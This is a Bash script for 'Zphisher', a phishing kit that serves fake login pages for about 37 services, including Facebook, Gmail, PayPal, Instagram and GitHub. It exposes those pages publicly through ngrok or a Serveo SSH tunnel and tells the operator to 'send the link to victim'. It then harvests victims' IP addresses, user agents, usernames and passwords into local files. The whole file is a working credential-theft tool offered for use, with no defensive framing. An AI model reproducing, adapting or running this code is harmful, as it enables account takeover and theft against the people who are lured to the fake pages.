# Zphisher V_1.0
# ==============================================
# Created By HTR-TECH @tahmid.rayat
# Instagram : https://instagram.com/tahmid.rayat
# Github : https://github.com/htr-tech/
# ==============================================
# Script Credit thelinuxchoice (github.com/thelinuxchoice)
# Some Phishing Pages are Created by thelinuxchoice (github.com/thelinuxchoice) & DarkSecDevlopers (github.com/DarkSecDevlopers)
#!/bin/bash

trap 'printf "\n";stop;exit 1' 2

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "\e[0m\e[1;93m PHP is not installed ! Install it."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "\e[0m\e[1;93m Curl is not installed ! Install it."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "\e[0m\e[1;93m Wget is not installed ! Install it"; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "\e[0m\e[1;93m Openssh is not installed ! Install it"; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "\e[0m\e[1;93m Unzip is not installed ! Install it"; exit 1; }

}    
banner() {

clear
printf " \e[33;1m ______      _     _     _               \e[0m\n"
printf " \e[33;1m|___  /     | |   (_)   | |              \e[0m\n"
printf " \e[33;1m   / / _ __ | |__  _ ___| |__   ___ _ __ \e[0m\n"
printf " \e[32;1m  / /\e[33;1m | '_ \| '_ \| / __| '_ \ / _ \ '__|\e[0m\n"
printf " \e[32;1m / /__| |_) | | | | \__ \ | | |  __/ |   \e[0m\n"
printf " \e[32;1m/_____| .__/|_| |_|_|___/_| |_|\___|_|   \e[0m\n"
printf " \e[33;1m      | |                                \e[0m\n"
printf " \e[33;1m      |_|                                \e[0m\n"
printf " \n"
printf " \e[92m[\e[37;1m+\e[92m]\e[33;1m Tool upgraded by htr-tech (tahmid.rayat)\e[0m\n"
printf " \n"
printf " \e[36;1m.:.Select Any Attack for your Victim.:.\e[0m\n"
printf " \n"

}
menu() {
     
printf "\e[96m[\e[0m\e[1;77m++\e[96m]\e[0m\e[1;96m Facebook\e[0m       \e[96m[\e[0m\e[1;77m13\e[96m]\e[0m\e[1;93m Paypal\e[0m        \e[96m[\e[0m\e[1;77m27\e[96m]\e[0m\e[1;93m Twitch\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m01\e[96m]\e[0m\e[1;93m Traditional\e[0m    \e[96m[\e[0m\e[1;77m14\e[96m]\e[0m\e[1;93m Linkedin\e[0m      \e[96m[\e[0m\e[1;77m28\e[96m]\e[0m\e[1;93m DeviantArt\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m02\e[96m]\e[0m\e[1;93m Voting Poll\e[0m    \e[96m[\e[0m\e[1;77m15\e[96m]\e[0m\e[1;93m Pinterest\e[0m     \e[96m[\e[0m\e[1;77m29\e[96m]\e[0m\e[1;93m StackoverFlow\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m03\e[96m]\e[0m\e[1;93m Fake Security\e[0m  \e[96m[\e[0m\e[1;77m16\e[96m]\e[0m\e[1;93m Twitter\e[0m       \e[96m[\e[0m\e[1;77m30\e[96m]\e[0m\e[1;93m CryptoCoinSniper\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m04\e[96m]\e[0m\e[1;93m Messenger\e[0m      \e[96m[\e[0m\e[1;77m17\e[96m]\e[0m\e[1;93m Ebay\e[0m          \e[96m[\e[0m\e[1;77m31\e[96m]\e[0m\e[1;93m Adobe\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m++\e[96m]\e[0m\e[1;96m Instagram\e[0m      \e[96m[\e[0m\e[1;77m18\e[96m]\e[0m\e[1;93m DropBox\e[0m       \e[96m[\e[0m\e[1;77m32\e[96m]\e[0m\e[1;93m Badoo\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m05\e[96m]\e[0m\e[1;93m Traditional\e[0m    \e[96m[\e[0m\e[1;77m19\e[96m]\e[0m\e[1;93m PlayStation\e[0m   \e[96m[\e[0m\e[1;77m33\e[96m]\e[0m\e[1;93m Reddit\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m06\e[96m]\e[0m\e[1;93m Followers\e[0m      \e[96m[\e[0m\e[1;77m20\e[96m]\e[0m\e[1;93m Steam\e[0m         \e[96m[\e[0m\e[1;77m34\e[96m]\e[0m\e[1;93m Snapchat\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m07\e[96m]\e[0m\e[1;93m Blue Badge\e[0m     \e[96m[\e[0m\e[1;77m21\e[96m]\e[0m\e[1;93m Protonmail\e[0m    \e[96m[\e[0m\e[1;77m35\e[96m]\e[0m\e[1;93m Spotify\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m08\e[96m]\e[0m\e[1;93m Gmail New\e[0m      \e[96m[\e[0m\e[1;77m22\e[96m]\e[0m\e[1;93m Yahoo\e[0m         \e[96m[\e[0m\e[1;77m36\e[96m]\e[0m\e[1;93m Origin\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m09\e[96m]\e[0m\e[1;93m Gmail Old \e[0m     \e[96m[\e[0m\e[1;77m23\e[96m]\e[0m\e[1;93m Yandex\e[0m        \e[96m[\e[0m\e[1;77m37\e[96m]\e[0m\e[1;93m Github\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m10\e[96m]\e[0m\e[1;93m Gmail Poll\e[0m     \e[96m[\e[0m\e[1;77m24\e[96m]\e[0m\e[1;93m Wordpress\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m11\e[96m]\e[0m\e[1;93m Microsoft\e[0m      \e[96m[\e[0m\e[1;77m25\e[96m]\e[0m\e[1;93m Vk\e[0m            \e[96m[\e[0m\e[1;77mx\e[96m]\\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m12\e[96m]\e[0m\e[1;93m Netflix\e[0m        \e[96m[\e[0m\e[1;77m26\e[96m]\e[0m\e[1;93m Vk Poll\e[0m\n"
printf "\e[0m\n"
read -p $'\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Select an option: \e[0m\en' option


if [[ $option == 1 || $option == 01 ]]; then
server="facebook"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="fb_advanced"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="fb_security"
start
elif [[ $option == 4 || $option == 04 ]]; then
server="fb_messenger"
start
elif [[ $option == 5 || $option == 05 ]]; then
server="instagram"
start
elif [[ $option == 6 || $option == 06 ]]; then
server="ig_followers"
start
elif [[ $option == 7 || $option == 07 ]]; then
server="ig_verify"
start
elif [[ $option == 8 || $option == 08 ]]; then
server="google_new"
start
elif [[ $option == 9 || $option == 09 ]]; then
server="google"
start
elif [[ $option == 10 ]]; then
server="google_poll"
start
elif [[ $option == 11 ]]; then
server="microsoft"
start
elif [[ $option == 12 ]]; then
server="netflix"
start
elif [[ $option == 13 ]]; then
server="paypal"
start
elif [[ $option == 14 ]]; then
server="linkedin"
start
elif [[ $option == 15 ]]; then
server="pinterest"
start
elif [[ $option == 16 ]]; then
server="twitter"
start
elif [[ $option == 17 ]]; then
server="ebay"
start
elif [[ $option == 18 ]]; then
server="dropbox"
start
elif [[ $option == 19 ]]; then
server="playstation"
start
elif [[ $option == 20 ]]; then
server="steam"
start
elif [[ $option == 21 ]]; then
server="protonmail"
start
elif [[ $option == 22 ]]; then
server="yahoo"
start
elif [[ $option == 23 ]]; then
server="yandex"
start
elif [[ $option == 24 ]]; then
server="wordpress"
start
elif [[ $option == 25 ]]; then
server="vk"
start
elif [[ $option == 26 ]]; then
server="vk_poll"
start
elif [[ $option == 27 ]]; then
server="twitch"
start
elif [[ $option == 28 ]]; then
server="deviantart"
start
elif [[ $option == 29 ]]; then
server="stackoverflow"
start
elif [[ $option == 30 ]]; then
server="cryptocoinsniper"
start
elif [[ $option == 31 ]]; then
server="adobe"
start
elif [[ $option == 32 ]]; then
server="badoo"
start
elif [[ $option == 33 ]]; then
server="reddit"
start
elif [[ $option == 34 ]]; then
server="snapchat"
start
elif [[ $option == 35 ]]; then
server="spotify"
start
elif [[ $option == 36 ]]; then
server="origin"
start
elif [[ $option == 37 ]]; then
server="github"
start
elif [[ $option == X || $option == x ]]; then
exit 1

else
printf "\e[1;91m [!] Invalid option [!]\e[0m\n"
sleep 1
banner
menu
fi

}
stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e linksender ]]; then
rm -rf linksender
fi

}
start() {
if [[ -e linksender ]]; then
rm -rf linksender
fi

printf "\n"
printf "\e[96m[\e[0m\e[1;77m01\e[96m]\e[0m\e[1;93m Ngrok.io\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m02\e[96m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m03\e[96m]\e[0m\e[1;93m Localhost.run \e[0m\e[1;92m(Coming soon)\e[0m\n"
d_o_server="2"
printf "\e[0m\n"
read -p $'\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' option_server
option_server="${option_server:-${d_o_server}}"
if [[ $option_server == 2 || $option_server == 02 ]]; then
start_s

elif [[ $option_server == 1 || $option_server == 01 ]]; then
start_n
else
printf "\e[1;93m [!] Invalid option [!]\e[0m\n"
sleep 1
banner
start
fi

}
start_s() {
if [[ -e websites/$server/ip.txt ]]; then
rm -rf websites/$server/ip.txt

fi
if [[ -e websites/$server/usernames.txt ]]; then
rm -rf websites/$server/usernames.txt

fi

def_port="5555"
printf "\e[0m\n"
printf '\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
start_serveo

}

start_serveo() {
printf "\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Launching Serveo ..\e[0m\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > linksender ' &
printf "\n"
sleep 7
send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" linksender)
printf "\n"
printf '\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $send_url
printf "\n"
found

}
start_n() {
if [[ -e websites/$server/ip.txt ]]; then
rm -rf websites/$server/ip.txt

fi
if [[ -e websites/$server/usernames.txt ]]; then
rm -rf websites/$server/usernames.txt

fi



if [[ -e ngrok ]]; then
echo ""
else
printf "\e[0m\n"
printf "\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:5555\e[0m\e[1;92m)\e[0m\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;96m[\e[1;97m!\e[1;96m]\e[1;93m Error \e[1;96m[\e[1;97m!\e[1;96m]\e[1;96m Please Install All Packges.\e[0m\n"
exit 1
fi



else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;96m[\e[1;97m!\e[1;96m]\e[1;93m Error \e[1;96m[\e[1;97m!\e[1;96m]\e[1;96m Please Install All Packges.\e[0m\n"
exit 1
fi
fi
fi

printf "\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Launching Ngrok ..\e[0m\n"
cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
./ngrok http 5555 > /dev/null 2>&1 &
sleep 7

ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $ngrok_link
found
}

found() {

printf "\n"
printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
while [ true ]; do


if [[ -e "websites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] Victim IP Found!\n"
c_ip
rm -rf websites/$server/ip.txt
fi
sleep 0.75
if [[ -e "websites/$server/usernames.txt" ]]; then
printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Login info Found!\n"
c_cred
rm -rf websites/$server/usernames.txt
fi
sleep 0.75


done 

}
c_ip() {
touch websites/$server/login_info.txt
ip=$(grep -a 'IP:' websites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' websites/$server/ip.txt | cut -d '"' -f2)
printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
printf "\e[0m\n"
printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/victim_ip.txt\e[0m\n" $server
cat websites/$server/ip.txt >> websites/$server/victim_ip.txt

}

c_cred() {

account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat websites/$server/usernames.txt >> websites/$server/login_info.txt
printf "\e[0m\n"
printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
printf "\n"
printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"

}

banner
dependencies
menu
